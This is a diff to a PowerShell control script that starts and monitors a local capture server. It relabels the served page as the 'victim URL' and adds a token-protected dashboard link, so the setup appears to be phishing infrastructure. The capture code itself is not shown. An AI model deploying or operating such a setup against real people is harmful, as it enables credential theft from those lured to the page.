@@ -27,6 +27,7 @@ $Root = Split-Path -Parent $MyInvocation.MyCommand.Path
 $ServerPy = Join-Path $Root 'server.py'
 $LogFile = Join-Path $Root 'logs\captures.log'
 $PidFile = Join-Path $Root 'logs\server.pid'
+$TokenFile = Join-Path $Root 'logs\dash_token.txt'
 
 function Get-ListenerPid {
     param([int]$P)
@@ -55,6 +56,13 @@ function Get-LanIp {
     return '<this-machine-ip>'
 }
 
+function Get-DashUrl {
+    if (-not (Test-Path $TokenFile)) { return $null }
+    $t = (Get-Content $TokenFile -ErrorAction SilentlyContinue | Select-Object -First 1)
+    if (-not $t) { return $null }
+    return "http://$(Get-LanIp):$Port/dash?k=$t"
+}
+
 function Start-Fish {
     $tracked = Get-TrackedPid
     if ($tracked) { Write-Host "Already running (pid $tracked)." -ForegroundColor Yellow; return }
@@ -76,8 +84,10 @@ function Start-Fish {
     Start-Sleep -Milliseconds 700
     if (Get-Process -Id $proc.Id -ErrorAction SilentlyContinue) {
         Write-Host "Started listener (pid $($proc.Id)) on port $Port." -ForegroundColor Green
-        Write-Host "  phone URL : http://$(Get-LanIp):$Port/" -ForegroundColor Green
-        Write-Host "  watch log : powershell -File .\ctl.ps1 log" -ForegroundColor Gray
+        Write-Host "  victim URL : http://$(Get-LanIp):$Port/" -ForegroundColor Green
+        $dash = Get-DashUrl
+        if ($dash) { Write-Host "  dashboard  : $dash" -ForegroundColor Magenta }
+        Write-Host "  watch log  : powershell -File .\ctl.ps1 log" -ForegroundColor Gray
     } else {
         Write-Host "Server failed to stay up - run it with -Foreground to see the error." -ForegroundColor Red
     }
@@ -115,7 +125,9 @@ function Show-Status {
         Write-Host "STATUS   : RUNNING" -ForegroundColor Green
         Write-Host "pid      : $holder"
         Write-Host "port     : $Port"
-        Write-Host "url      : http://$(Get-LanIp):$Port/"
+        Write-Host "victim   : http://$(Get-LanIp):$Port/"
+        $dash = Get-DashUrl
+        if ($dash) { Write-Host "dashboard: $dash" -ForegroundColor Magenta }
     } else {
         Write-Host "STATUS   : STOPPED (nothing on port $Port)" -ForegroundColor Yellow
     }
